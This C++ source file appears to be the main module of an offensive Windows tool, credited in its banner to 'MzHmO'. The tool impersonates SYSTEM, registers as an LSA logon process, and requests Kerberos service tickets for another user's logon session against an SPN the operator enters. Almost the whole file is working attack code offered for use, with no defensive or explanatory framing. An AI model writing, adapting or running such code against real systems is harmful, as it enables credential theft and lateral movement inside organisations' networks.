#include "stuff.h"

void ShowAwesomeBanner() {

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 0x0C);
	std::cout << R"(
. .      __
 : .   __==__
     __ (~~)
     `\\/;~\
        (~`\\._
       _.||[___]
)" << std::endl;
	std::wcout << L"\t\t\t Michael Zhmaylo ( https://github.com/MzHmO )" << std::endl;
	SetConsoleTextAttribute(hConsole, 0x07);
}


LSA_STRING* create_lsa_string(const char* value)
{
	char* buf = new char[100];
	LSA_STRING* str = (LSA_STRING*)buf;
	str->Length = strlen(value);
	str->MaximumLength = str->Length;
	str->Buffer = buf + sizeof(LSA_STRING);
	memcpy(str->Buffer, value, str->Length);
	return str;
}

bool is_valid_spn(std::wstring spn) {

	// Format"serviceclass/host"
	std::wregex spn_regex(L"([a-zA-Z0-9]+)/([a-zA-Z0-9.-]+)");
	return std::regex_match(spn.begin(), spn.end(), spn_regex);
}
std::wstring read_and_validate_spn() {
	std::wstring spn = L"";

	std::wcout << L"[?] Enter SPN: " << std::endl;;

	while (1) {
		std::wcin >> spn;
		bool valid = is_valid_spn(spn); //regex
		if (valid) {
			break;
		}
		else {
			std::wcout << L"[-] Incorrect SPN\n";
		}
	}
	return spn;
}

LUID GetLuid() {
	HANDLE hProcess = GetCurrentProcess();
	LUID luidBuff; // RANDOM LUID (FAKE)
	AllocateLocallyUniqueId(&luidBuff);
	luidBuff.HighPart = 0;
	luidBuff.LowPart = 0;
	HANDLE hToken;
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
		return luidBuff;
	}

	// Получаем размер буфера для информации о токене
	DWORD dwTokenInfoSize = 0;
	if (!GetTokenInformation(hToken, TokenStatistics, NULL, 0, &dwTokenInfoSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		CloseHandle(hToken);
		return luidBuff;
	}

	PTOKEN_STATISTICS pTokenStats = reinterpret_cast<PTOKEN_STATISTICS>(new BYTE[dwTokenInfoSize]);

	if (!GetTokenInformation(hToken, TokenStatistics, pTokenStats, dwTokenInfoSize, &dwTokenInfoSize)) {
		std::cerr << "[-] Cent Get Information from token" << std::endl;
		CloseHandle(hToken);
		delete[] reinterpret_cast<BYTE*>(pTokenStats);
		return luidBuff;
	}


	return pTokenStats->AuthenticationId;
}

int main() {

	setlocale(LC_ALL, "");
	ShowAwesomeBanner();

	if (ImpersonateSystem() != 0) {
		std::wcout << L"[-] System Impersonation Failed" << std::endl;
		return -1;
	}
	std::wcout << L"[+] System Impersonation Success" << std::endl;

	LUID LogonSession;
	if (!LogonInfo(&LogonSession)) {
		std::wcout << L"[-] Error getting info about logon session" << std::endl;
		return 1;
	}
	std::wcout << L"[!] You've selected session with Logon ID: " << to_hex(LogonSession.LowPart) << '\n';

	PLSA_STRING krbname = create_lsa_string("GetTGS from MzHmO");
	LSA_OPERATIONAL_MODE info;
	HANDLE LsaHandle = NULL;
	NTSTATUS status = LsaRegisterLogonProcess(krbname, &LsaHandle, &info);
	if (status != STATUS_SUCCESS) {
		std::cout << "[-] Failed LsaRegisterLogonProcess: " << LsaNtStatusToWinError(status) << std::endl;
		return 1;
	}
	LUID currentLuid;
	AllocateLocallyUniqueId(&currentLuid);
	currentLuid = GetLuid();
	std::wcout << L"[+] Current Luid: " << to_hex(currentLuid.LowPart) << std::endl;
	std::cout << "[+] LsaRegisterLogonProcess Success. Lsa Handle: " << LsaHandle << std::endl;

	ULONG authpackageId;
	LSA_STRING kerbPackage;
	kerbPackage.Buffer = (PCHAR)MICROSOFT_KERBEROS_NAME_A;
	kerbPackage.Length = (USHORT)lstrlenA(kerbPackage.Buffer);
	kerbPackage.MaximumLength = kerbPackage.Length + 1;

	status = LsaLookupAuthenticationPackage(LsaHandle, &kerbPackage, &authpackageId);
	if (status != STATUS_SUCCESS) {
		std::cout << "[-] Failed LsaLookupAuthenticationPackage: " << LsaNtStatusToWinError(status) << std::endl;
		LsaDeregisterLogonProcess(LsaHandle);
		return 1;
	}

	std::cout << "[+] Kerberos Package: " << authpackageId << std::endl;

	std::wstring _spn = read_and_validate_spn();
	LPCWSTR spn = _spn.c_str();

	if (!AskTgs(LsaHandle, authpackageId, LogonSession, spn, currentLuid)) {
		std::cout << "[-] AskTgs Failed" << std::endl;
		LsaDeregisterLogonProcess(LsaHandle);
		return 1;
	}


	std::cout << "[+] Success" << std::endl;
	LsaDeregisterLogonProcess(LsaHandle);
	return 0;
}